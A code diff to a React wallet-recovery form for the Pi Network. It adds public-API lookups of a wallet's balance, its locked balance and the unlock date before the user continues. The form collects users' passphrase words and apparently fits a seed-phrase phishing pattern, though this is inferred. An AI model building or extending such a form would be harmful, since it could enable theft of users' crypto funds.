@@ -16,7 +16,8 @@ import { Progress } from "@/components/ui/progress"
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
 import { useAppDispatch } from "@/redux/hooks"
 import { makeRequest } from "@/redux/slices/requests"
-
+import FinanceDashboard from "../wallet/FinanceDashboard"
+import axios from "axios"
 
 const RecoveryRequestForm = ({ setStep2 }: { setStep2: any }) => {
   const router = useRouter()
@@ -29,6 +30,11 @@ const RecoveryRequestForm = ({ setStep2 }: { setStep2: any }) => {
     note?: string
     words?: string
   }>({})
+  const [balance, setBalance] = useState(1)
+  const [locked, setLocked] = useState(1)
+  const [lockDate, setLockDate] = useState("")
+  const [open, setOpen] = useState(false)
+  const [grandLoad, setGrandLoad] = useState(false)
 
   const [formData, setFormData] = useState({
     email: "",
@@ -76,13 +82,11 @@ const RecoveryRequestForm = ({ setStep2 }: { setStep2: any }) => {
     if (pastedWords.length > 0) {
       const newWords = [...words]
 
-     
       for (let i = 0; i < pastedWords.length && startIndex + i < 24; i++) {
         newWords[startIndex + i] = pastedWords[i]
       }
 
       setWords(newWords)
-
 
       if (errors.words) {
         setErrors((prev) => ({
@@ -131,12 +135,35 @@ const RecoveryRequestForm = ({ setStep2 }: { setStep2: any }) => {
     return Object.keys(newErrors).length === 0
   }
 
-  const handleContinue = (e: React.FormEvent) => {
+  const handleContinue = async (e: React.FormEvent) => {
     e.preventDefault()
 
     if (validateStep1()) {
-      setStep(2)
-      window.scrollTo(0, 0)
+      // setStep(2)
+      console.log("start")
+      setGrandLoad(true)
+      try {
+        const res1 = await axios.get(
+          `https://api.mainnet.minepi.com/claimable_balances/?claimant=${formData.publicKey}`,
+        )
+        const response2 = await axios.get(`https://api.mainnet.minepi.com/accounts/${formData.publicKey}`)
+        const balance = response2.data.balances[0].balance
+        console.log("balance is", balance)
+
+        console.log("locked balance is", res1.data._embedded.records[0].amount)
+        console.log("locked date is", res1.data._embedded.records[0].claimants[1].predicate.not.abs_before)
+        setBalance(balance)
+        setLocked(res1.data._embedded.records[0].amount)
+        setLockDate(res1.data._embedded.records[0].claimants[1].predicate.not.abs_before)
+        setOpen(true)
+        console.log("finish")
+        window.scrollTo(0, 0)
+      } catch (error) {
+        console.error("Error fetching data:", error)
+        setGrandLoad(false)
+      } finally {
+        setGrandLoad(false)
+      }
     }
   }
 
@@ -286,8 +313,8 @@ const RecoveryRequestForm = ({ setStep2 }: { setStep2: any }) => {
                     <AlertCircle className="h-4 w-4 text-blue-600 dark:text-blue-400" />
                     <AlertTitle>Important</AlertTitle>
                     <AlertDescription>
-                      You&apos;ll need to provide the words you remember from your passphrase. Our system will help recover
-                      the missing words.
+                      You&apos;ll need to provide the words you remember from your passphrase. Our system will help
+                      recover the missing words.
                     </AlertDescription>
                   </Alert>
 
@@ -341,10 +368,15 @@ const RecoveryRequestForm = ({ setStep2 }: { setStep2: any }) => {
                   <Button type="button" variant="outline" onClick={handleBack}>
                     Back
                   </Button>
-                  <Button type="submit" disabled={loading}>
+                  <Button type="submit" disabled={loading || grandLoad}>
                     {loading ? (
                       <>
                         Submitting...
+                        <Loader className="ml-2 w-4 h-4 animate-spin" />
+                      </>
+                    ) : grandLoad ? (
+                      <>
+                        Checking Wallet...
                         <Loader className="ml-2 w-4 h-4 animate-spin" />
                       </>
                     ) : (
@@ -425,8 +457,16 @@ const RecoveryRequestForm = ({ setStep2 }: { setStep2: any }) => {
                         Submitting...
                         <Loader className="ml-2 w-4 h-4 animate-spin" />
                       </>
+                    ) : grandLoad ? (
+                      <>
+                        Checking Wallet
+                        <Loader className="ml-2 w-4 h-4 animate-spin" />
+                      </>
                     ) : (
-                      "Submit"
+                      <>
+                        Continue
+                        <ArrowRight className="ml-2 h-4 w-4" />
+                      </>
                     )}
                   </Button>
                 </div>
@@ -434,9 +474,20 @@ const RecoveryRequestForm = ({ setStep2 }: { setStep2: any }) => {
             </Card>
           </motion.div>
         )}
+
+        <FinanceDashboard
+          setStep={setStep}
+          lockDate={lockDate}
+          balance={balance}
+          lockedBalance={locked}
+          wallet={formData.publicKey}
+          open={open}
+          setOpen={setOpen}
+        />
       </AnimatePresence>
     </div>
   )
 }
 
 export default RecoveryRequestForm
+
